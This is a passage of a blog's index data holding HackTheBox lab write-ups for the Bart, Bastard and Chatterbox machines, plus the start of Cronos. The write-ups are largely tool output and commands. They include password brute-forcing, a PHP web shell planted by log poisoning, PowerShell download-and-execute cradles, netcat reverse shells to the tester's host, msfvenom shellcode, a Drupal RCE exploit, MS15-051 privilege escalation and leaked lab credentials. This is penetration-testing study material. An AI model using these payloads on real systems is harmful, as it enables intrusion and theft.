--exclude-length 75 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://internal-01.bart.htb/simple_chat/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 75 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/09/04 12:18:36 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 0] [--\u0026gt; ../] /login.php (Status: 302) [Size: 0] [--\u0026gt; login_form.php] /register.php (Status: 302) [Size: 0] [--\u0026gt; register_form.php] /media (Status: 301) [Size: 169] [--\u0026gt; http://internal-01.bart.htb/simple_chat/media/] /chat.php (Status: 302) [Size: 4] [--\u0026gt; simple_chat/login_form.php] /css (Status: 301) [Size: 167] [--\u0026gt; http://internal-01.bart.htb/simple_chat/css/] /includes (Status: 301) [Size: 172] [--\u0026gt; http://internal-01.bart.htb/simple_chat/includes/] /Index.php (Status: 302) [Size: 0] [--\u0026gt; ../] /Login.php (Status: 302) [Size: 0] [--\u0026gt; login_form.php] /js (Status: 301) [Size: 166] [--\u0026gt; http://internal-01.bart.htb/simple_chat/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; ../] Let\u0026rsquo;s launch hydra https://github.com/gnebbia/hydra_notes To send hydra to Burp we can HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-post-form \u0026quot;/simple_chat/login.php:uname=^USER^\u0026amp;passwd=^PASS^\u0026amp;submit=Login:Password\u0026quot; harvey:Password1 └─$ hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-post-form \u0026#34;/simple_chat/login.php:uname=^USER^\u0026amp;passwd=^PASS^\u0026amp;submit=Login:Password\u0026#34; Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-04 12:40:05 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-post-form://internal-01.bart.htb:80/simple_chat/login.php:uname=^USER^\u0026amp;passwd=^PASS^\u0026amp;submit=Login:Password [STATUS] 716.00 tries/min, 716 tries in 00:01h, 14343683 to do in 333:54h, 16 active [STATUS] 695.00 tries/min, 2085 tries in 00:03h, 14342314 to do in 343:57h, 16 active [80][http-post-form] host: internal-01.bart.htb login: harvey password: Password1 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-04 12:45:17 So apparently we could\u0026rsquo;ve register our user Since there is a source-code available in https://github.com/magkopian/php-ajax-simple-chat Now we have access to chat Let\u0026rsquo;s check the source We have call to http://internal-01.bart.htb/log/log.php?filename=log.txt\u0026amp;username=harvey Possible lfi So after playing around, each time someone visits log.php we have a new record in http://internal-01.bart.htb/log/log.php?filename=log.txt\u0026username=harvey We need to visit http://internal-01.bart.htb/log/log.php?filename=log.php\u0026amp;username=harvey We can try log poisoning We can change our User-Agent to \u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt; when visiting http://internal-01.bart.htb/log/log.php?filename=log.php\u0026username=harvey Then we add new parameter and check the response where we get our rce Let\u0026rsquo;s get reverse shell ...\u0026amp;cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/shell.ps1') Root So before starting enumeration, we have upgrade our shell to 64-bit one Apparently there are some registries that specific for 32 and 64 bit versions We can download nc64.exe and run it to get 64-bit version shell So the reason is that the privesc creds are in registry To be specific in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon If we run powerup or do it manually, both ways doesn\u0026rsquo;t show the creds For privesc we usually go through each check in https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation And the reason is that 32-bit and 64-bit have different versions of HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon You can clearly see it from the pictures Lesson learned: we need enumerate from both 32 and 64 bit processes Okay, now since we have creds administrator:3130438f31186fbaf962f407711faddb I tried using Invoke-Runas.ps1 but couldn\u0026rsquo;t manage to make it work So I used Invoke-Command way PS C:\\inetpub\\wwwroot\\internal-01\\log\u0026gt; $username = \u0026#34;BART\\Administrator\u0026#34; PS C:\\inetpub\\wwwroot\\internal-01\\log\u0026gt; $password = \u0026#34;3130438f31186fbaf962f407711faddb\u0026#34; PS C:\\inetpub\\wwwroot\\internal-01\\log\u0026gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force PS C:\\inetpub\\wwwroot\\internal-01\\log\u0026gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.10.16.5/shell.ps1\u0026#39;) } -Credential $credential -Computer localhost ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bart/images/bart.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bart/","summary":"Bart Enumeration nmap └─$ nmap -Pn -p- 10.10.10.81 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 16:59 BST Nmap scan report for 10.10.10.81 (10.10.10.81) Host is up (0.091s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http └─$ nmap -Pn -p80 -sC -sV 10.10.10.81 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 17:04 BST Nmap scan report for 10.10.10.81 (10.10.10.81) Host is up (0.","tags":["HTB","iex","cewl","username-anarchy","log-poisoning","php","webshell","nishang","winlogon","powershell-run-as","run-as"],"title":"[HTB] Machine: Bart"},{"categories":null,"contents":"Bastard Enumeration nmap └─$ nmap -Pn -p- 10.10.10.9 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:43 BST Nmap scan report for 10.10.10.9 (10.10.10.9) Host is up (0.093s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 49154/tcp open unknown └─$ nmap -Pn -p80,135,49154 -sC -sV 10.10.10.9 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:46 BST Nmap scan report for 10.10.10.9 (10.10.10.9) Host is up (0.11s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to Bastard | Bastard | http-methods: |_ Potentially risky methods: TRACE |_http-generator: Drupal 7 (http://drupal.org) 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Web Server gobuster └─$ gobuster dir -u http://10.10.10.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.9/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/01 10:32:20 Starting gobuster in directory enumeration mode =============================================================== /search (Status: 403) [Size: 1233] /misc (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.9/misc/] /themes (Status: 301) [Size: 148] [--\u0026gt; http://10.10.10.9/themes/] /modules (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.9/modules/] /user (Status: 200) [Size: 7411] /0 (Status: 200) [Size: 7571] /scripts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.9/scripts/] /node (Status: 200) [Size: 7571] /tag (Status: 403) [Size: 1233] /sites (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.9/sites/] /template (Status: 403) [Size: 1233] /Search (Status: 403) [Size: 1233] /includes (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.9/includes/] /profiles (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.9/profiles/] /Misc (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.9/Misc/] /Themes (Status: 301) [Size: 148] [--\u0026gt; http://10.10.10.9/Themes/] /root (Status: 403) [Size: 1233] /entries (Status: 403) [Size: 1233] /repository (Status: 403) [Size: 1233] /Scripts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.9/Scripts/] /rest (Status: 200) [Size: 62] /User (Status: 200) [Size: 9054] /Modules (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.9/Modules/] /Admin (Status: 403) [Size: 1233] /Template (Status: 403) [Size: 1233] /Sites (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.9/Sites/] Foothold/User http://10.10.10.9/robots.txt We have Drupal 7.54 searchsploit We could also start droopescan scan drupal -u http://10.10.10.9 Drupalgeddon2 and Drupalgeddon3 vulnerabilities are out of the scope, since this box was released before those vulnerabilities So probably 7.x Module Service - Remote Code Execution is the one we need We need to change specified lines It looks like we need to specify rest endpoint We saw from gobuster results that it\u0026rsquo;s /rest After changing we have ... $url = \u0026#39;http://10.10.10.9\u0026#39;; $endpoint_path = \u0026#39;/rest\u0026#39;; $endpoint = \u0026#39;rest_endpoint\u0026#39;; $file = [ \u0026#39;filename\u0026#39; =\u0026gt; \u0026#39;shell.php\u0026#39;, \u0026#39;data\u0026#39; =\u0026gt; \u0026#39;\u0026lt;?php system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; ]; ... We need php-curl to execute the exploit Execute the exploit └─$ php 41564.php # Exploit Title: Drupal 7.x Services Module Remote Code Execution # Vendor Homepage: https://www.drupal.org/project/services # Exploit Author: Charles FOL # Contact: https://twitter.com/ambionics # Website: https://www.ambionics.io/blog/drupal-services-module-rce #!/usr/bin/php Stored session information in session.json Stored user information in user.json Cache contains 7 entries File written: http://10.10.10.9/shell.php └─$ curl 10.10.10.9/shell.php?cmd=whoami nt authority\\iusr Let\u0026rsquo;s get reverse shell I tried the trick 0xdf used, where we share binary via smb and execute it to get a shell └─$ impacket-smbserver share . -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed └─$ curl \u0026#39;10.10.10.9/shell.php?cmd=\\\\10.10.16.4\\share\\nc64.exe%20-e%20cmd.exe%2010.10.16.4%206666\u0026#39; And we receive the connection Root Enumerate c:\\Users\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ======================= ========================================= ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled c:\\Users\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Group used for deny only CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group c:\\Users\u0026gt;systeminfo systeminfo Host Name: BASTARD OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3582622-84461 Original Install Date: 18/3/2017, 7:04:46 �� System Boot Time: 1/9/2023, 11:38:07 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2.047 MB Available Physical Memory: 1.555 MB Virtual Memory: Max Size: 4.095 MB Virtual Memory: Available: 3.573 MB Virtual Memory: In Use: 522 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.9 Potential MS15-051 https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/README.md Download https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip And share it via smbserver like before c:\\Users\u0026gt;\\\\10.10.16.4\\share\\MS15-051-KB3045171\\ms15-051x64.exe \u0026#34;whoami\u0026#34; \\\\10.10.16.4\\share\\MS15-051-KB3045171\\ms15-051x64.exe \u0026#34;whoami\u0026#34; [#] ms15-051 fixed by zcgonvh [!] process with pid: 2104 created. ============================== nt authority\\system Get reverse shell c:\\Users\u0026gt;\\\\10.10.16.4\\share\\MS15-051-KB3045171\\ms15-051x64.exe \u0026#34;\\\\10.10.16.4\\share\\nc64.exe -e cmd.exe 10.10.16.4 7777\u0026#34; \\\\10.10.16.4\\share\\MS15-051-KB3045171\\ms15-051x64.exe \u0026#34;\\\\10.10.16.4\\share\\nc64.exe -e cmd.exe 10.10.16.4 7777\u0026#34; [#] ms15-051 fixed by zcgonvh [!] process with pid: 2324 created. ============================== ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bastard/images/bastard.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bastard/","summary":"Bastard Enumeration nmap └─$ nmap -Pn -p- 10.10.10.9 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:43 BST Nmap scan report for 10.10.10.9 (10.10.10.9) Host is up (0.093s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 49154/tcp open unknown └─$ nmap -Pn -p80,135,49154 -sC -sV 10.10.10.9 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:46 BST Nmap scan report for 10.","tags":["HTB","drupal","drupalgeddon2","drupalgeddon3","droopescan","searchsploit","ms15-051","smbserver","php","webshell"],"title":"[HTB] Machine: Bastard"},{"categories":null,"contents":"Chatterbox Enumeration nmap └─$ nmap -Pn -p- 10.10.10.74 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 11:10 BST Stats: 0:08:51 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 52.82% done; ETC: 11:27 (0:07:54 remaining) Nmap scan report for 10.10.10.74 (10.10.10.74) Host is up (0.19s latency). Not shown: 65523 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 9255/tcp open mon 9256/tcp open unknown └─$ nmap -Pn -p135,139,445,9255,9256 -sC -sV 10.10.10.74 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 11:42 BST Nmap scan report for 10.10.10.74 (10.10.10.74) Host is up (0.13s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open �+sN\u0026#39;V Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 9255/tcp open http AChat chat system httpd |_http-title: Site doesn\u0026#39;t have a title. |_http-server-header: AChat 9256/tcp open achat AChat chat system Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h19m25s, deviation: 2h18m36s, median: 4h59m23s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Chatterbox | NetBIOS computer name: CHATTERBOX\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-09-01T11:41:53-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required | smb2-time: | date: 2023-09-01T15:41:51 |_ start_date: 2023-09-01T15:08:09 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.74 seconds Nothing on smb Strange ports 9255 and 9256 Google shows searchsploit Foothold We have an exploit from exploit-db but it pops calc.exe We have to modify it Create a new payload Change urls etc Generate a new payload using msfvenom └─$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=6666 -e x86/unicode_mixed -b \u0026#39;\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#39; BufferRegister=EAX -f python Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 834 (iteration=0) x86/unicode_mixed chosen with final size 834 Payload size: 834 bytes Final size of python file: 4117 bytes buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\u0026#34; buf += b\u0026#34;\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\u0026#34; buf += b\u0026#34;\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\u0026#34; buf += b\u0026#34;\\x41\\x44\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\u0026#34; buf += b\u0026#34;\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\u0026#34; ... Replace the buf in the script with the new payload Launch meterpreter But the session dies Let\u0026rsquo;s try powershell powershell -c \u0026quot;IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/shell.ps1')\u0026quot; └─$ msfvenom -a x86 --platform Windows -p windows/exec CMD=\u0026#34;powershell -c \\\u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.10.16.4/shell.ps1\u0026#39;)\\\u0026#34;\u0026#34; -e x86/unicode_mixed -b \u0026#39;\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#39; BufferRegister=EAX -f python Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/unicode_mixed x86/unicode_mixed succeeded with size 692 (iteration=0) x86/unicode_mixed chosen with final size 692 Payload size: 692 bytes Final size of python file: 3417 bytes buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\u0026#34; buf += b\u0026#34;\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\u0026#34; buf += b\u0026#34;\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\u0026#34; buf += b\u0026#34;\\x41\\x44\\x41\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\u0026#34; buf += b\u0026#34;\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\u0026#34; buf += b\u0026#34;\\x41\\x41\\x41\\x5a\\x31\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\u0026#34; buf += b\u0026#34;\\x31\\x41\\x49\\x41\\x49\\x41\\x42\\x41\\x42\\x41\\x42\\x51\u0026#34; buf += b\u0026#34;\\x49\\x31\\x41\\x49\\x51\\x49\\x41\\x49\\x51\\x49\\x31\\x31\u0026#34; buf += b\u0026#34;\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\\x5a\\x42\\x41\\x42\u0026#34; buf += b\u0026#34;\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\\x47\\x42\\x39\u0026#34; buf += b\u0026#34;\\x75\\x34\\x4a\\x42\\x59\\x6c\\x39\\x58\\x52\\x62\\x79\\x70\u0026#34; buf += b\u0026#34;\\x69\\x70\\x6d\\x30\\x61\\x50\\x33\\x59\\x79\\x55\\x50\\x31\u0026#34; ... Replace payload again And run the exploit By the way 0xdf uses script + meterpreter + auto-migrate script technique to get a shell, might worth checking He also shows other ways to get a shell Root Alfred PS C:\\users\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled PS C:\\users\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Mandatory group, Enabled by default, Enabled group So it looks like Alfred is the owner of root.txt PS C:\\users\u0026gt; dir Administrator\\desktop Directory: C:\\users\\Administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar-- 9/1/2023 11:08 AM 34 root.txt PS C:\\users\u0026gt; type Administrator\\desktop\\root.txt PS C:\\users\u0026gt; Get-Content : Access to the path \u0026#39;C:\\users\\Administrator\\desktop\\root.txt\u0026#39; is d enied. At line:1 char:5 + type \u0026lt;\u0026lt;\u0026lt;\u0026lt; Administrator\\desktop\\root.txt + CategoryInfo : PermissionDenied: (C:\\users\\Administrator\\deskto p\\root.txt:String) [Get-Content], UnauthorizedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsof t.PowerShell.Commands.GetContentCommand We have access to Desktop PS C:\\users\u0026gt; icacls Administrator\\desktop\\ Administrator\\desktop\\ NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) CHATTERBOX\\Administrator:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) CHATTERBOX\\Alfred:(I)(OI)(CI)(F) Successfully processed 1 files; Failed processing 0 files But can\u0026rsquo;t read the flag PS C:\\users\u0026gt; icacls Administrator\\desktop\\root.txt Administrator\\desktop\\root.txt CHATTERBOX\\Administrator:(F) Successfully processed 1 files; Failed processing 0 files Let\u0026rsquo;s try granting the permissions PS C:\\users\u0026gt; icacls Administrator\\desktop\\root.txt /grant alfred:F processed file: Administrator\\desktop\\root.txt Successfully processed 1 files; Failed processing 0 files PS C:\\users\u0026gt; icacls Administrator\\desktop\\root.txt Administrator\\desktop\\root.txt CHATTERBOX\\Alfred:(F) CHATTERBOX\\Administrator:(F) Successfully processed 1 files; Failed processing 0 files Alternative way Running powerup shows autologon creds PS C:\\users\\Alfred\u0026gt; IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.10.16.4/powerup.ps1\u0026#39;) PS C:\\users\\Alfred\u0026gt; Invoke-Allchecks DefaultDomainName : DefaultUserName : Alfred DefaultPassword : Welcome1! AltDefaultDomainName : AltDefaultUserName : AltDefaultPassword : Check : Registry Autologons We can try reusing the same password for Administrator via psexec It works ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/chatterbox/images/chatterbox.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/chatterbox/","summary":"Chatterbox Enumeration nmap └─$ nmap -Pn -p- 10.10.10.74 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 11:10 BST Stats: 0:08:51 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 52.82% done; ETC: 11:27 (0:07:54 remaining) Nmap scan report for 10.10.10.74 (10.10.10.74) Host is up (0.19s latency). Not shown: 65523 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 9255/tcp open mon 9256/tcp open unknown └─$ nmap -Pn -p135,139,445,9255,9256 -sC -sV 10.","tags":["HTB","msfvenom","meterpreter","achat","autorunscript","powerup","autologon","psexec"],"title":"[HTB] Machine: Chatterbox"},{"categories":null,"contents":"Cronos Enumeration nmap └─$ nmap -Pn -p- 10.10.10.13 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 14:23 BST Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery Parallel DNS resolution of 1 host. Timing: About 0.00% done Warning: 10.10.10.13 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.13 (10.10.10.13) Host is up (0.15s latency). Not shown: 65520 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http └─$ nmap -Pn -p22,53,80 -sC -sV 10.10.10.13 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 15:04 BST Nmap scan report for 10.10.10.13 (10.10.10.13) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 